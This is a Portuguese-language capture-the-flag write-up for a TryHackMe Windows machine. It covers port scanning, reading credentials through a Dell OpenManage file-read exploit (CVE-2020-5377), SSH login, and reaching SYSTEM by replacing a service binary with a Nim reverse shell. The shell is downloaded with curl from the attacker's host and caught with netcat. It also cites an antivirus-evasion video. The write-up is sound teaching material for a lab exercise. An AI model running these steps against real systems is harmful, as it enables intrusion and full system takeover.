> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/hack-smarter-security.md).

# Hack Smarter Security

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FCtHbWZ3ON7jixbz0YLOX%2Fimage.png?alt=media&amp;token=7bcb8df6-41cd-48cd-b401-a6229c46c2a7" alt="" width="375"><figcaption></figcaption></figure>

{% embed url="<https://tryhackme.com/r/room/hacksmartersecurity>" %}

**Classificação** : Medium

**Criador** : [Tyler Ramsbey](https://www.youtube.com/@TylerRamsbey)

Ferramentas : Rustscan, nmap&#x20;

Adicionar `hackersmarter.thm` no arquivo hosts

```bash
echo '10.10.19.172 hackersmarter.thm' >> /etc/hosts
```

### Enumeração

Enumeração de portas com o `rustscan`&#x20;

```bash
$ rustscan -a hackersmarter.thm -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.19.172:21
Open 10.10.19.172:22
Open 10.10.19.172:80
Open 10.10.19.172:1311
Open 10.10.19.172:3389

```

Validação  das portas encontradas com `nmap`

```bash
$ nmap -sV -sC -p 21,22,80,1311,3389 -Pn hackersmarter.thm

                                ...SNIP...

80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HackSmarterSec
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
1311/tcp open  ssl/rxmon?
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
| fingerprint-strings: 

                                ...SNIP...
```

* A varredura revelou que o nosso alvo é uma máquina windows
* Tentamos fazer login no `FTP`  com credenciais padrão, não encontramos nada de útil
* Na tentativa de descobrir arquivos ocultos na porta `80` , também não tivemos sucesso com arquivos interessantes
* Verificamos a porta `1311` onde encontramos um Dell OpenManage na versão 9.4.0.2

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FXgZZwJmQsqIWIwJ9Li3N%2F1.png?alt=media&amp;token=ddd9aa4c-78e2-4915-9d66-962f04bde69b" alt=""><figcaption></figcaption></figure>

Ao procurar por um exploit da versão encontrada, econtramos o seguinte exploit :&#x20;

{% embed url="<https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514>" %}

Localizaçao das credencias no arquivo `web.config`&#x20;

```bash
$ python3 CVE-2020-5377.py <REDACTED> 10.10.19.172:1311
[-] No server.pem certificate file found. Generating one...
.+++++++++++++++++++++++++++++++++++++++*...+..+....+++++++++++++++++++++++++++++++++++++++*...+............++++++
..+.+...........................+........+...+....+......+.........+..+.+.........+...+........+...+....+.....+.+..+....+...+.................+.+........+++++++++++++++++++++++++++++++++++++++*....+..+.+++++++++++++++++++++++++++++++++++++++*......+.....+.........+....+..+....+...+......++++++
-----
Session: 3F3D0BFDBFD0172A37E98D71DF069F0D
VID: 969EFDE8BD7E792C
file > C:\inetpub\wwwroot\hacksmartersec\web.config.
Reading contents of C:\inetpub\wwwroot\hacksmartersec\web.config.:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="REDACTED" />
  </appSettings>
  <location path="web.config">
                                  ...SNIP...
```

### Sinalizador do user

Após encontrar as credenciais do usuário, vamos tentar um login ssh

```powershell
Directory of C:\Users\tyler\Desktop

06/30/2023  07:12 PM    <DIR>          .
06/30/2023  07:12 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/27/2023  09:42 AM                25 user.txt <---
               3 File(s)          1,106 bytes
               2 Dir(s)  14,109,523,968 bytes free
```

### Escalação de Privilégios

Referência :&#x20;

[How To Bypass FULLY Updated Windows Defender & Windows 11 With Nim for a STABLE Reverse Shell](https://www.youtube.com/watch?v=BX-vFcRV664)

Descobri que o `spoofer-scheduler`binário do serviço estava rodando com muitas permissões como LocalSystem.

```bash
PS C:\> ps 

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    150      10    15500      14008              3712   0 amazon-ssm-agent
     88       6     3148       4952       0.05   3924   0 cmd
    113       6     1212       5008       0.17    852   0 conhost
    152       9     6600      12492              3380   0 conhost
    151       9     6596      13128              3800   0 conhost
    344      14     2388       5424               384   0 csrss
    161       9     1652       4800               460   1 csrss
    699      35   172536     151332              2052   0 dsm_om_connsvc64
     53       3      496       1204               280   0 smss
    204      11     1740       8888              1572   0 spoofer-scheduler
```

O plano agora é interromper o `spoofer-scheduler`serviço. Em seguida, compilamos um shell reverso para um exe com o mesmo nome usado para o binário do serviço, sobrescrevemos o binário do serviço com nosso shell reverso e, finalmente, iniciamos o serviço e obtemos um shell superpoderoso como SYSTEM.

Parando o `spoofer-scheduler`serviço.

```powershell
stop spoofer-scheduler

move spoofer-scheduler.exe spoofer-scheduler.exe.bak
```

Compilar o revshell com o [nim](https://github.com/Sn1r/Nim-Reverse-Shell) com o mesmo nome

```bash
$ nim c -d:mingw --app:gui -o:spoofer-scheduler.exe rev_shell.nim 
Hint: used config file '/etc/nim/nim.cfg' [Conf]
Hint: used config file '/etc/nim/config.nims' [Conf]

```

Enviar para a máquina do alvo

* Servidor web no linux&#x20;

```bash
$ python3 -m http.server 80
```

* Download do revshell no windows

```powershell
curl http://IP:80/spoofer-scheduler.exe -o spoofer-scheduler.exe 
```

Iniciar um ouvinte netcat para obter o shell reverso após iniciar o serviço

```
$ nc -nvlp 900
```

Iniciar o serviço

```powershell
sc start spoofer-scheduler
```

Obtendo o reverse shell

```powershell
C:\Windows\system32> whoami /user

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18
```
